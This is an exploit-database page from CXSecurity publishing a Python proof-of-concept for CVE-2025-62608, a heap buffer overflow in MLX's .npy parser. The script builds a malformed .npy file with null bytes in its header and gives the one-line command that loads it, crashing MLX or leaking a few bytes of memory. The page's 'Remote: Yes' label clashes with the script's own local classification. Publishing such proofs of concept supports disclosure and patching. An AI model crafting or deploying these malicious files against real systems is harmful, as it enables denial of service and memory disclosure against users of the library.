---
title: MLX < = 0.29.3 - Heap-based Buffer Overflow in .npy Parser
url: https://cxsecurity.com/issue/WLB-2026020032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-26
fetch_date: 2026-02-27T04:06:59.084842
---

# MLX < = 0.29.3 - Heap-based Buffer Overflow in .npy Parser

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MLX <= 0.29.3 - Heap-based Buffer Overflow in .npy Parser** **2026.02.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-62608](https://cxsecurity.com/cveshow/CVE-2025-62608/ "Click to see CVE-2025-62608")**  CWE: **[CWE-122 Heap-based Buffer Overflow](https://cxsecurity.com/cwe/CWE-122%20Heap-based%20Buffer%20Overflow "Click to see CWE-122 Heap-based Buffer Overflow")** | |

#!/usr/bin/env python3
"""
Exploit Title: MLX <= 0.29.3 - Heap-based Buffer Overflow in .npy Parser
CVE: CVE-2025-62608
Date: 2026-02-24
Exploit Author: Mohammed Idrees Banyamer
Author Country: Jordan
Instagram: @banyamer\_security
Vendor Homepage: https://github.com/ml-explore/mlx
Software Link: https://github.com/ml-explore/mlx
Affected: mlx <= 0.29.3 (pip package)
Tested on: Ubuntu 22.04 / Python 3.11 + mlx 0.29.3
Category: Denial of Service / Local
Platform: Linux / macOS (Apple Silicon)
Exploit Type: Proof of Concept
CVSS: 5.5 (Medium) - AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H
Description:
Heap-buffer-overflow (CWE-122) in mlx::core::load() during NumPy .npy parsing.
Early null byte truncates std::string; fixed offset access (header[34]) causes
13-byte out-of-bounds heap read → crash or limited info leak.
Fixed in: mlx >= 0.29.4
Usage:
python3 cve-2025-62608.py
python3 -c "import mlx.core as mx; mx.load('exploit.npy')"
Notes:
Triggers segfault or ASan heap-buffer-overflow.
Reference: https://github.com/ml-explore/mlx/security/advisories/GHSA-w6vg-jg77-2qg6
"""
BANNER = r"""
███╗ ███╗██╗ ██╗ ██╗ ██╗ ██╗███████╗ █████╗ ██████╗
████╗ ████║██║ ╚██╗██╔╝ ██║ ██║██╔════╝██╔══██╗██╔══██╗
██╔████╔██║██║ ╚███╔╝ ███████║█████╗ ███████║██████╔╝
██║╚██╔╝██║██║ ██╔██╗ ╚════██║██╔══╝ ██╔══██║██╔══██╗
██║ ╚═╝ ██║███████╗██╔╝ ██╗ ██║███████╗██║ ██║██║ ██║
╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝
CVE-2025-62608 • Heap Buffer Overflow • MLX .npy Exploit
PoC by Mohammed Idrees Banyamer (@banyamer\_security)
===================================================
"""
print(BANNER)
import struct
import os
# ──────────────────────────────────────────────────────────────────────────────
# Generate malicious .npy file (reproduces advisory condition exactly)
# ──────────────────────────────────────────────────────────────────────────────
magic = b'\x93NUMPY'
version = b'\x01\x00' # NumPy v1.0
header\_content = b"{'descr': '<u2', 'fo\x00\x00\x00\x00n\_order': False, 'shape': (3,), }"
# Exactly 118 bytes header + newline (v1 .npy format)
padding = b' ' \* (118 - len(header\_content) - 1)
header = header\_content + padding + b'\n'
payload = (
magic +
version +
struct.pack('<H', 118) +
header +
b'\x00\x00\x00\x80\xff\xff' # minimal dummy data
)
filename = "exploit.npy"
try:
with open(filename, "wb") as f:
f.write(payload)
abs\_path = os.path.abspath(filename)
file\_size = os.path.getsize(filename)
print(f"[+] Malicious .npy file generated successfully!")
print(f" Path : {abs\_path}")
print(f" Size : {file\_size} bytes")
print("\n[+] To trigger the heap overflow:")
print(f" python3 -c \"import mlx.core as mx; mx.load('{filename}')\"")
print("\nOn vulnerable mlx <= 0.29.3 you should see:")
print(" → Segmentation fault")
print(" or ASan report: heap-buffer-overflow (read ~13 bytes past buffer)")
print("\nPatched in: mlx >= 0.29.4")
print("Advisory: https://github.com/ml-explore/mlx/security/advisories/GHSA-w6vg-jg77-2qg6")
except Exception as e:
print(f"[-] Failed to write file: {e}")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020032)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top